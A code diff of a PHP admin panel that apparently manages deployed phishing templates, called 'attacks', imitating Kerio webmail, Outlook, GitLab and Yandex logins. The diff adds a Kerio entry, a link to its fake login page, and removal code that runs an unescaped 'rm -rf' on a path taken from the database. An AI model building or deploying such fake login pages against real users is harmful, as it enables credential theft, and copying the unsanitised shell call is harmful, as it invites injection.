@@ -133,7 +133,7 @@
                         </ol>
          
                     </div> <!--/top -->
-                    </div>
+                </div>
                     <div class="row">
                 
  <!-- Таблица -->     <div class="col-lg-12">
@@ -221,6 +221,17 @@
                     }
                 }
 
+                if($_POST['attack'] == "Kerio"){
+                    $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Kerio' ");
+                    while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
+                        $dir = $row[1];
+                        $delete_template = $dir.'/webmail';
+                        exec ("rm -rf $delete_template");
+                        mysqli_query($link,"DELETE FROM deployed WHERE attack_name = 'Kerio' ");
+                        mysqli_query($link,"DELETE FROM attacks_stats WHERE attack_name = 'Kerio' ");
+                    }
+                }
+
                 if($_POST['attack'] == "Проверка пароля"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Проверка пароля' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
@@ -294,6 +305,7 @@
                     $dir = $row[1];
                     echo '<div class="col-lg-1 text-center" style="border:1px solid #ccc;width:400px;margin:0 30px 30px 0;padding:30px ">';
                     if($attack_name == "Яндекс.Диск"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/index.php' target='_blank''>Перейти к шаблону $attack_name</p>";}
+                    if($attack_name == "Kerio"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/webmail/login/index.php' target='_blank''>Перейти к шаблону $attack_name</p>";}
                      if($attack_name == "Gitlab"){echo "<p><a href='https://gitlab.$_SERVER[HTTP_HOST]/users/' target='_blank''>Перейти к шаблону $attack_name</p>";}
                     if($attack_name == "Яндекс.Паспорт"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/index.php' target='_blank'>$attack_name</p>";}
                     if($attack_name == "Outlook"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/owa' target='_blank'>$attack_name</p>";}
@@ -308,7 +320,7 @@
                                     <input class="btn btn-default" type="submit" id="submit-btn" name="delete" value="Удалить">
                                     <input type="hidden" name="attack" value="'.$attack_name.'"> 
                                 </form>
-                           </div>
+                           </div>                          
                         ';
                 }
                    
@@ -327,6 +339,8 @@
         <!-- /#page-wrapper -->
 
     </div>
+
+
     <!-- /#wrapper -->
 
     <!-- jQuery -->
